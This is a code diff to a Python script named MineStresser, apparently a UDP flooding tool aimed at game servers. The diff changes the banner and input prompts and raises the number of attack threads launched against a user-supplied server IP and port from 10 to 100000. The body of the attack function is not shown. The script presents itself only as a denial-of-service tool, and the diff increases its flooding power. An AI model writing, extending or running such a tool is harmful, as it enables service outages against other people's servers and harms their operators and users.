@@ -17,7 +17,7 @@ def attack(ip, port):
 art = r"""
 
 
-MineStresserUDP
+═══ M I N E S T R E S S E R ═══
 
 """
 os.system("clear")
@@ -25,8 +25,8 @@ print("\033[31m" + art)
 print("Credit: @MineGamerST")
 print(" ")
 time.sleep(1)
-ip = input("IP: ")
-port = int(input("PORT: "))
+ip = input("Enter The Server IP: ")
+port = int(input("Enter The Server Port: "))
 time.sleep(1)
 print(" ")
 os.system("clear")
@@ -35,7 +35,7 @@ print(" ")
 print(f"Running {ip} {port}")
 # Start Attack
 
-for i in range(10):
+for i in range(100000):
   t = threading.Thread(target=attack,args=(ip, port), daemon=True)
   t.start()
 while True:
